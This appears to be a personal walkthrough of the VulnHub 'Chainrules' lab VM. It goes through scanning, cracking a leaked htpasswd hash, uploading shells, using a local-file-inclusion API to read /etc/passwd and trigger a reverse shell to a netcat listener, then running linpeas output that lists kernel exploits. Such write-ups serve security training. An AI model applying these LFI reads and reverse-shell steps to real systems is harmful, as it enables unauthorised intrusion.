CHAINRULES
==========

DATE = 18/05/22 TIME: 7:30
==========================


HOST DISCOVERY
===============


NETDISCOVER
===========

```bash
sudo netdiscover

 Currently scanning: 192.168.144.0/16   |   Screen View: Unique Hosts                                                               
                                                                                                                                    
 53 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 3180                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.100.1   24:44:27:2a:9c:c0     50    3000  HUAWEI TECHNOLOGIES CO.,LTD                                                      
 192.168.100.3   3e:6a:61:7f:a0:b9      1      60  Unknown vendor                                                                   
 192.168.100.6   60:f6:77:8b:13:7f      1      60  Intel Corporate                                                                  
 192.168.100.51  08:00:27:45:73:d2      1      60  PCS Systemtechnik GmbH 


TARGET= 192.168.100.51 
```

ENUMERATION
============

NAMP 1000
==========
```bash
sudo namp -sC -sV --min-rate 1500 192.168.100.51 | tee nmap1000.md same as all

┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ sudo nmap -sC -sV --min-rate 1500 192.168.100.51 | tee nmap1000.md
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 10:34 EDT
Nmap scan report for 192.168.100.51
Host is up (0.0014s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.100.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: FRANK's Website | Under development
|_http-server-header: Apache/2.2.22 (Ubuntu)
8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 08:00:27:45:73:D2 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds


```
FTP:
====


```

noTHing at all


```


PORT 80:
=========

DESCRIPTION
-----------
```sql
A  RESUME WEB IS RUNNING AT PORT 80

```

DIRECTORY SCAN
--------------

```

┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ gobuster dir -u http://192.168.100.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error  -t 100 -x php,txt,html 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.51/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/05/18 11:03:29 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 314] [--> http://192.168.100.51/img/]
/index                (Status: 200) [Size: 334]                                 
/index.html           (Status: 200) [Size: 13516]                               
/css                  (Status: 301) [Size: 314] [--> http://192.168.100.51/css/]
/development          (Status: 401) [Size: 481]                                 
/js                   (Status: 301) [Size: 313] [--> http://192.168.100.51/js/] 
/vendor               (Status: 301) [Size: 317] [--> http://192.168.100.51/vendor/]
/robots.txt           (Status: 200) [Size: 21]                                     
/robots               (Status: 200) [Size: 21]                                     
/LICENSE              (Status: 200) [Size: 1093]                                   
/server-status        (Status: 403) [Size: 295]                                    
                                                                                   
===============================================================
2022/05/18 11:11:12 Finished
===============================================================
                                                                  
```

NIKTO
=====

```

┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ nikto --host  http://192.168.100.51/ | tee nikto.md
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.100.51
+ Target Hostname:    192.168.100.51
+ Target Port:        80
+ Start Time:         2022-05-18 11:12:48 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 1051931, size: 13516, mtime: Sat Apr 14 09:39:32 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.html.bak
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8877 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-05-18 11:13:19 (GMT-4) (31 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

index.html.bak
===========
```


┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ cat index.html.bak 
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
<a href="/development">development</a>
<!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path -->
</body></html>
               

```

CRACKING THE ABOVE HASH
=======================

```

USERNAME = frank
password = frank!!!



* Here is my unfinished tools list
- the uploader tool (finished but need security review)

```
UPLOADER-TOOL
=============

```
http://192.168.100.51/development/uploader/


UPLOADED SOME SHELLS THERE


```
PORT 8011:
==========


DEVELOPMENT SERVER

DIRECTORY SCAN
==============
```
┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ gobuster dir -u http://192.168.100.51:8011/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error  -t 100 -x php,txt,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.51:8011/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/05/18 11:20:17 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 30]
/api                  (Status: 301) [Size: 321] [--> http://192.168.100.51:8011/api/]
/server-status        (Status: 403) [Size: 297]                                      
                                                                                     
===============================================================
2022/05/18 11:27:51 Finished
===============================================================






```

NIKTO
=====

```


┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ nikto --host  http://192.168.100.51:8011/ | tee nikto8011.md
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.100.51
+ Target Hostname:    192.168.100.51
+ Target Port:        8011
+ Start Time:         2022-05-18 11:30:07 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 1052109, size: 30, mtime: Sat Apr 14 08:00:08 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-05-18 11:30:36 (GMT-4) (29 seconds)
---------------------------------------------------------------------------


```


http://192.168.100.51:8011/api/
================================

```

This API will be used to communicate with Frank's server
but it's still under development

* web_api.php

* records_api.php

* files_api.php

* database_api.php

```

FILES_API_PHP
============

```

http://192.168.100.51:8011/api/files_api.php

No parameter called file passed to me

* Note : this API don't use json , so send the file name in raw format


┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ curl -X POST -d "file=/etc/passwd" http://192.168.100.51:8011/api/files_api.php

<head>
  <title>franks website | simple website browser API</title>
</head>

root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false


```

WE CAN CALL THE SHELLS USING LFI
================================

```

/var/www/development/uploader/FRANKuploads/

┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ curl -X POST -d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.100.51:8011/api/files_api.php


┌──(kali㉿kali)-[~/Desktop/THM/VULNHUB/chainrules]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.100.39] from (UNKNOWN) [192.168.100.51] 60967
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 14:10:34 up  1:42,  0 users,  load average: 0.00, 0.00, 0.91
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ 



user.txt
$ cat user.txt   
4795aa2a9be22fac10e1c25794e75c1b
$ 

``` 

PRIV-ESC
========

```




                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                                                                      
    |---------------------------------------------------------------------------|                                                                                      
    |         Become a Patreon    :     https://www.patreon.com/peass           |                                                                                      
    |         Follow on Twitter   :     @carlospolopm                           |                                                                                      
    |         Respect on HTB      :     SirBroccoli & makikvues                 |                                                                                      
    |---------------------------------------------------------------------------|                                                                                      
    |                                 Thank you!                                |                                                                                      
    \---------------------------------------------------------------------------/                                                                                      
          linpeas-ng by carlospolop                                                                                                                                    
                                                                                                                                                                       
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                    
                                                                                                                                                                       
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                               
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                                
                                         ╚═══════════════════╝                                                                                                         
OS: Linux version 2.6.35-19-generic (buildd@allspice) (gcc version 4.4.5 20100824 (prerelease) (Ubuntu/Linaro 4.4.4-9ubuntu2) ) #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ubuntu
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                          
                                                                                                                                                                       

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                       
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                                 
                                        ╚════════════════════╝                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                          
Linux version 2.6.35-19-generic (buildd@allspice) (gcc version 4.4.5 20100824 (prerelease) (Ubuntu/Linaro 4.4.4-9ubuntu2) ) #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010
Distributor ID: Ubuntu
Description:    Ubuntu maverick (development branch)
Release:        10.10
Codename:       maverick

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                             
Sudo version 1.7.2p7                                                                                                                                                   


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                     
/usr/local/bin:/usr/bin:/bin                                                                                                                                           
New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin

╔══════════╣ Date & uptime
Wed May 18 14:15:42 PDT 2022                                                                                                                                           
 14:15:42 up  1:47,  0 users,  load average: 0.08, 0.02, 0.65

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                   
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                              
proc            /proc           proc    nodev,noexec,nosuid 0       0                                                                                                  
UUID=4ebc068f-6b7c-4fe0-8f92-d31dd3133f5f /               ext4    errors=remount-ro 0       1
UUID=3a38e0c7-58d0-4a96-8b44-f8cddfbcd1a9 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                
HISTFILESIZE=0                                                                                                                                                         
OLDPWD=/home/frank
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2.pid
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
APACHE_LOCK_DIR=/var/lock/apache2
HISTSIZE=0
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                      
dmesg Not Found                                                                                                                                                        
                                                                                                                                                                       
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                     
sed: -e expression #1, char 27: unknown option to `s'                                                                                                                  
cat: write error: Broken pipe
cat: write error: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: writing output: Broken pipe
grep: write error

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                
  [1] american-sign-language                                                                                                                                           
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] caps_to_root
      CVE-n/a
      Source: http://www.exploit-db.com/exploits/15916
  [4] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [5] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [6] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [8] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [9] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [10] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                          
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                      
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                               
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                 
═╣ Is ASLR enabled? ............... Yes                                                                                                                                
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes                                                                                                                                

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                                
                                             ╚═══════════╝                                                                                                             
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                                                                                         
═╣ Is this a container? ........... No                                                                                                                                 
═╣ Any running containers? ........ No                                                                                                                                 
                                                                                                                                                                       

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                                 
                          ╚════════════════════════════════════════════════╝                                                                                           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                 
root         1  0.0  0.1  23988  1912 ?        Ss   12:28   0:00 /sbin/init                                                                                            
root       326  0.0  0.0  17348   896 ?        S    12:28   0:00 upstart-udev-bridge --daemon
root       331  0.0  0.0  17396  1004 ?        S<s  12:28   0:00 udevd --daemon
root       792  0.0  0.0  17392   820 ?        S<   12:34   0:00  _ udevd --daemon
root       587  0.0  0.2  50044  2928 ?        Ss   12:28   0:00 /usr/sbin/sshd -D
syslog     596  0.0  0.1 257332  1700 ?        Sl   12:28   0:00 rsyslogd -c4
root       637  0.0  0.0   6384   664 tty4     Ss+  12:28   0:00 /sbin/getty -8 38400 tty4
root       643  0.0  0.0   6384   668 tty5     Ss+  12:28   0:00 /sbin/getty -8 38400 tty5
root       651  0.0  0.0   6384   668 tty2     Ss+  12:28   0:00 /sbin/getty -8 38400 tty2
root       652  0.0  0.0   6384   664 tty3     Ss+  12:28   0:00 /sbin/getty -8 38400 tty3
root       657  0.0  0.0   6384   664 tty6     Ss+  12:28   0:00 /sbin/getty -8 38400 tty6
root       660  0.0  0.1  21384  1040 ?        Ss   12:28   0:00 cron
root       670  0.0  0.1  27804  1488 ?        Ss   12:28   0:00 /usr/sbin/vsftpd
root       741  0.0  0.7 105728  7636 ?        Ss   12:28   0:00 /usr/sbin/apache2 -k start
www-data  1017  0.1  0.6 106228  7012 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1028  0.0  0.6 106236  7060 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1055  0.1  0.6 106236  7044 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1111  0.1  0.6 106244  6704 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1116  0.0  0.6 106244  7012 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1124  0.0  0.6 106244  6724 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1127  0.0  0.6 106236  7044 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1132  0.0  0.7 106236  7284 ?        S    13:04   0:04  _ /usr/sbin/apache2 -k start
www-data  1198  0.0  0.0   4404   612 ?        S    14:10   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data  1202  0.0  0.0   4404   676 ?        S    14:10   0:00  |       _ /bin/sh -i
www-data  1214  0.7  0.1   5200  1496 ?        S    14:15   0:00  |           _ /bin/sh ./linpeas.sh
www-data  5104  0.0  0.0   5200   904 ?        S    14:15   0:00  |               _ /bin/sh ./linpeas.sh
www-data  5108  0.0  0.1  15420  1176 ?        R    14:15   0:00  |               |   _ ps fauxwww
www-data  5107  0.0  0.0   5200   904 ?        S    14:15   0:00  |               _ /bin/sh ./linpeas.sh
www-data  1161  0.0  0.6 106236  7024 ?        S    13:09   0:01  _ /usr/sbin/apache2 -k start
www-data  1162  0.0  0.6 106244  6720 ?        S    13:09   0:01  _ /usr/sbin/apache2 -k start
root       786  0.0  0.0   6852   280 ?        Ss   12:28   0:00 dhclient
root       789  0.0  0.0   6384   668 tty1     Ss+  12:28   0:00 /sbin/getty -8 38400 tty1

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                
                                                                                                                                                                       
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                     
COMMAND    PID     USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME                                                                                                    

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                          
gdm-password Not Found                                                                                                                                                 
gnome-keyring-daemon Not Found                                                                                                                                         
lightdm Not Found                                                                                                                                                      
vsftpd process found (dump creds from memory as root)                                                                                                                  
apache2 process found (dump creds from memory as root)
sshd Not Found
                                                                                                                                                                       
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                      
/usr/bin/crontab                                                                                                                                                       
incrontab Not Found
-rw-r--r-- 1 root  root   724 Aug 24  2010 /etc/crontab                                                                                                                

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 13  2018 .
drwxr-xr-x 78 root root 4096 May 18 12:28 ..
-rw-r--r--  1 root root  102 Aug 24  2010 .placeholder
-rw-r--r--  1 root root  544 Feb 13  2017 php5

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root  4096 Apr 13  2018 .
drwxr-xr-x 78 root root  4096 May 18 12:28 ..
-rw-r--r--  1 root root   102 Aug 24  2010 .placeholder
-rwxr-xr-x  1 root root   633 Jul 15  2016 apache2
-rwxr-xr-x  1 root root 15431 Aug 26  2010 apt
-rwxr-xr-x  1 root root   314 Jul 30  2010 aptitude
-rwxr-xr-x  1 root root   502 May 27  2010 bsdmainutils
-rwxr-xr-x  1 root root   256 Aug 23  2010 dpkg
-rwxr-xr-x  1 root root    89 Aug  5  2010 logrotate
-rwxr-xr-x  1 root root  1335 Aug 17  2010 man-db
-rwxr-xr-x  1 root root   606 Mar 24  2010 mlocate
-rwxr-xr-x  1 root root  2149 Jun 16  2009 popularity-contest
-rwxr-xr-x  1 root root  3594 Aug 24  2010 standard

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 13  2018 .
drwxr-xr-x 78 root root 4096 May 18 12:28 ..
-rw-r--r--  1 root root  102 Aug 24  2010 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 13  2018 .
drwxr-xr-x 78 root root 4096 May 18 12:28 ..
-rw-r--r--  1 root root  102 Aug 24  2010 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Apr 13  2018 .
drwxr-xr-x 78 root root 4096 May 18 12:28 ..
-rw-r--r--  1 root root  102 Aug 24  2010 .placeholder
